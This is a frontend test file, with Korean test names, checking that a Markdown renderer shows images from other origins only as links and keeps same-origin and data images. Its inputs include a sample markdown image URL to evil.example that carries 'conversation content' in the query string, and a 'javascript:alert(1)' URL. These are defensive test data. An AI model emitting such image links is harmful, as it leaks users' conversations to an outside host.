import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { isSameOriginImage } from "@/lib/safeImage";
import { Markdown } from "./Markdown";

describe("Markdown 그림(운영 준비 B1·F21)", () => {
  it("외부 그림은 불러오지 않고 눌러서 여는 링크로 보여 준다", () => {
    const { container } = render(
      <Markdown text="![요약](https://evil.example/p.png?q=대화내용)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: "그림 열기: 요약" });
    expect(link.getAttribute("href")).toContain("https://evil.example/p.png");
    expect(link.getAttribute("rel")).toContain("noopener");
  });

  it("이 서비스가 내주는 그림은 그대로 보여 준다", () => {
    const { container } = render(<Markdown text="![차트](/api/v1/files/abc/download)" />);
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe("/api/v1/files/abc/download");
  });

  it("같은 주소인지 가린다", () => {
    expect(isSameOriginImage("data:image/png;base64,AAA")).toBe(true);
    expect(isSameOriginImage("//evil.example/x.png")).toBe(false);
    expect(isSameOriginImage(`${window.location.origin}/x.png`)).toBe(true);
    expect(isSameOriginImage("javascript:alert(1)")).toBe(false);
    expect(isSameOriginImage("")).toBe(false);
  });
});
